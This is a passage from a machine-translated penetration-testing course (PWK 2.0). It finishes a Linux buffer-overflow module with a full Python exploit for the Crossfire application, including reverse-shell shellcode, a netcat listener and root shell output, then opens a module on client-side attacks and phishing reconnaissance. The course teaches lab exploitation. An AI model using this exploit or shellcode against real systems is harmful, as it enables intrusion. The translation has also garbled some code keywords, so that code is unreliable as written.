<div style="position:absolute;top:106074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">人物。</font><font style="vertical-align: inherit;">这将确保我们保持原始偏移量以覆盖 EIP 寄存器</font></font></nobr></div>
<div style="position:absolute;top:106094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用我们想要的字节。</font><font style="vertical-align: inherit;">最终的概念验证实现有效载荷并调整缓冲区</font></font></nobr></div>
<div style="position:absolute;top:106113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相应的尺寸：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:106165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:106199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 = "10.11.0.128"</font></font></nobr></div>
<div style="position:absolute;top:106233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nop_sled = "\x90" * 8 # NOP 雪橇</font></font></nobr></div>
<div style="position:absolute;top:106267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -fp</font></font></nobr></div>
<div style="position:absolute;top:106284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:106318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码 = ""</font></font></nobr></div>
<div style="position:absolute;top:106335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29"</font></font></nobr></div>
<div style="position:absolute;top:106352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41"</font></font></nobr></div>
<div style="position:absolute;top:106369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71"</font></font></nobr></div>
<div style="position:absolute;top:106385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04"</font></font></nobr></div>
<div style="position:absolute;top:106402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d"</font></font></nobr></div>
<div style="position:absolute;top:106420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72"</font></font></nobr></div>
<div style="position:absolute;top:106437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34"</font></font></nobr></div>
<div style="position:absolute;top:106453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode += "\x7f\x6d\x02\x36"</font></font></nobr></div>
<div style="position:absolute;top:106487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">padding = "\x41" * ( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4368 - len(nop_sled) - len(shellcode)</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
<div style="position:absolute;top:106504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "\x96\x45\x13\x08" # 0x08134596</font></font></nobr></div>
<div style="position:absolute;top:106521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"</font></font></nobr></div>
<div style="position:absolute;top:106555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\</font></font></nobr></div>
<div style="position:absolute;top:106572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x90\x00#"</font></font></nobr></div>
<div style="position:absolute;top:106606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:106623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[*] 发送恶意缓冲区..."</font></font></nobr></div>
<div style="position:absolute;top:106657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect（（主机，13327））</font></font></nobr></div>
<div style="position:absolute;top:106674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 s.recv(1024)</font></font></nobr></div>
<div style="position:absolute;top:106708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:106725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:106759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[*]有效载荷已发送！”</font></font></nobr></div>
<div style="position:absolute;top:106778;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 376 - Crossfire 应用程序的最终利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们重新启动 Crossfire 应用程序并使用附加的调试器启动我们的漏洞利用。</font><font style="vertical-align: inherit;">在我们的</font></font></nobr></div>
<div style="position:absolute;top:106827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击机器，我们在 Netcat 侦听器上收到一个连接，但外壳似乎卡住了：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:106879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:106896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.128] 40542 连接到 [10.11.0.4]</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106913;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID</font></font></b></nobr></div>
<div style="position:absolute;top:106930;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106949;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 377 - 反向 shell 卡住了 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:107095;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="91"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 91 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:107128;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:108205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:108205;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:108205;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">411</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到我们的调试器窗口，应用程序似乎已暂停，当我们尝试</font></font></nobr></div>
<div style="position:absolute;top:107243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了让它运行，我们会收到一条关于调试事件的消息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107498;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 238：EDB - 调试事件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只需</font><font style="vertical-align: inherit;">在事件上</font><font style="vertical-align: inherit;">单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”并返回到我们的 Netcat 侦听器即可解决问题。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:107548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每次我们运行一个命令时，我们都必须重复这个过程。</font></font></nobr></div>
<div style="position:absolute;top:107581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是因为调试器正在捕获</font><font style="vertical-align: inherit;">在某些情况下生成的</font><font style="vertical-align: inherit;">SIGCHLD </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事件</font></font></nobr></div>
<div style="position:absolute;top:107600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发生在我们从反向 shell 生成的子进程上，例如进程退出、崩溃、</font></font></nobr></div>
<div style="position:absolute;top:107620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止等。</font></font></nobr></div>
<div style="position:absolute;top:107653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为确保我们的漏洞利用按预期工作，我们重新启动 Crossfire 应用程序并运行它</font></font></nobr></div>
<div style="position:absolute;top:107672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有附加调试器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:107724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:107740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.128] 40544 连接到 [10.11.0.4]</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107757;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:107775;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:107794;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 378 - 来自 Linux 机器的工作反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们所怀疑的，在没有附加调试器的情况下运行应用程序为我们提供了一个工作</font></font></nobr></div>
<div style="position:absolute;top:107843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从受害者机器反向shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107877;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.7.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 更新您的概念验证以包含工作负载。</font></font></nobr></div>
<div style="position:absolute;top:107936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 从带调试器和不带调试器的 Crossfire 应用程序中获取一个 shell。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:107972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.8 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们介绍了在 Linux 上利用缓冲区溢出漏洞的过程</font></font></nobr></div>
<div style="position:absolute;top:108034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统。</font><font style="vertical-align: inherit;">类似于 Windows 缓冲区溢出模块中使用的漏洞，我们能够</font></font></nobr></div>
<div style="position:absolute;top:108053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试易受攻击的应用程序中的崩溃并为其编写完整的漏洞利用程序。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:108155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Andries Brouwer, 2003), https://www.win.tue.nl/~aeb/linux/lk/lk-5.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:108283;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="92"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 92 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108316;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:109393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:109393;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:109393;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">412</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:108406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.8.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13. 客户端攻击</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击媒介特别阴险，因为它们利用客户端软件的弱点，</font></font></nobr></div>
<div style="position:absolute;top:108496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如浏览器，而不是利用服务器软件。</font><font style="vertical-align: inherit;">这通常涉及某种形式的用户</font></font></nobr></div>
<div style="position:absolute;top:108515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互和欺骗，以便客户端软件执行恶意代码。</font></font></nobr></div>
<div style="position:absolute;top:108548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些攻击媒介对攻击者特别有吸引力，因为它们不需要直接</font></font></nobr></div>
<div style="position:absolute;top:108567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或对受害者机器的可路由访问。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108629;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击本质上颠覆了传统的攻击模式，并具有</font></font></i></nobr></div>
<div style="position:absolute;top:108649;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创造了对新防御范式的需求。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，假设在不可路由的内部网络中的员工收到了一封电子邮件</font></font></nobr></div>
<div style="position:absolute;top:108730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有附件或指向恶意网站的链接。</font><font style="vertical-align: inherit;">如果员工打开附件或单击</font></font></nobr></div>
<div style="position:absolute;top:108749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在链接上，内容（可能是文档或网页的内容）作为输入发送</font></font></nobr></div>
<div style="position:absolute;top:108769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到他们机器上的本地应用程序。</font><font style="vertical-align: inherit;">然后应用程序将呈现该输入并可能</font></font></nobr></div>
<div style="position:absolute;top:108788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行恶意代码。</font><font style="vertical-align: inherit;">员工的机器将被利用，可能会启动一个远程</font></font></nobr></div>
<div style="position:absolute;top:108807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 从受感染的机器通过防火墙传到攻击者的监听器</font></font></nobr></div>
<div style="position:absolute;top:108827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:108860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将描述在此类问题中需要考虑的一些重要因素。</font></font></nobr></div>
<div style="position:absolute;top:108879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击和演练涉及恶意 HTML 应用程序和</font></font></nobr></div>
<div style="position:absolute;top:108898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软 Word 文档。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1 了解你的目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从攻击者的角度来看，客户端攻击的主要困难在于枚举</font></font></nobr></div>
<div style="position:absolute;top:108996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者的客户端软件，这不像枚举 WWW 或</font></font></nobr></div>
<div style="position:absolute;top:109016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP 服务器。</font><font style="vertical-align: inherit;">客户端攻击成功的秘诀是，就像大多数事情一样</font></font></nobr></div>
<div style="position:absolute;top:109035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，准确而彻底的信息收集。</font></font></nobr></div>
<div style="position:absolute;top:109068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用被动和主动信息收集技术来对抗我们的客户端攻击</font></font></nobr></div>
<div style="position:absolute;top:109088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109122;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:109122;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被动客户信息收集</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在利用被动信息收集技术时，我们不会直接与我们的</font></font></nobr></div>
<div style="position:absolute;top:109179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预期目标。</font></font></nobr></div>
<div style="position:absolute;top:109212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，在最近的一次接触中，我们的任务是试图损害企业</font></font></nobr></div>
<div style="position:absolute;top:109231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用客户端攻击和各种网络钓鱼</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">332</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术的</font><font style="vertical-align: inherit;">员工</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">然而，我们并没有</font></font></nobr></div>
<div style="position:absolute;top:109251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许与员工进行电话联系。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:109343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">332 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Phishing</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:109471;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="93"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 93 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109504;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:110581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:110581;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:110581;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">413</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于这种限制，我们搜索了各种已知的外部公司 IP 地址，发现</font></font></nobr></div>
<div style="position:absolute;top:109619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个站点上的一个站点托管从各个附属站点收集的用户代理数据。</font></font></nobr></div>
<div style="position:absolute;top:109652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此信息类似于以下屏幕截图中显示的信息，揭示了底层</font></font></nobr></div>
<div style="position:absolute;top:109671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业客户端机器的操作系统版本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109950;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 239：识别受害者的浏览器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它还显示了浏览器类型和版本以及用户代理中列出的已安装插件</font></font></nobr></div>
<div style="position:absolute;top:110000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">细绳。</font><font style="vertical-align: inherit;">我们修改了一个现有的漏洞，并针对运行该漏洞的实验室机器启动了它</font></font></nobr></div>
<div style="position:absolute;top:110020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们的目标相同的操作系统和浏览器版本。</font><font style="vertical-align: inherit;">测试成功，所以我们使用</font></font></nobr></div>
<div style="position:absolute;top:110039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在针对我们公司目标的客户端攻击中利用漏洞，并获得反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:110072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以经常找到此类信息，例如在社交媒体和论坛网站上。</font></font></nobr></div>
<div style="position:absolute;top:110091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事实上，我们甚至发现了电脑屏幕的照片，显示了有关操作的信息。</font></font></nobr></div>
<div style="position:absolute;top:110110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统类型和版本、应用程序版本、正在使用的防病毒应用程序等等。</font><font style="vertical-align: inherit;">时间</font></font></nobr></div>
<div style="position:absolute;top:110130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花在研究上的时间永远不会浪费。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110164;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:110164;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主动收集客户信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相比之下，主动客户信息收集技术与目标直接联系</font></font></nobr></div>
<div style="position:absolute;top:110222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器或其用户。</font></font></nobr></div>
<div style="position:absolute;top:110254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能涉及给用户打电话以试图提取有用的信息或</font></font></nobr></div>
<div style="position:absolute;top:110274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向受害者发送有针对性的电子邮件，希望点击一个链接，该链接将列举目标的</font></font></nobr></div>
<div style="position:absolute;top:110293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本、浏览器版本和安装的扩展。</font></font></nobr></div>
<div style="position:absolute;top:110326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在本节探索主动信息收集技术。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110360;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.1.2.1 社会工程和客户端攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于大多数客户端攻击需要与目标进行某种形式的交互，例如要求</font></font></nobr></div>
<div style="position:absolute;top:110414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标点击链接、打开电子邮件、运行附件或打开文档，我们应该</font></font></nobr></div>
<div style="position:absolute;top:110434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">先发制人地利用社会工程</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">333</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">策略来提高我们成功的机会。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
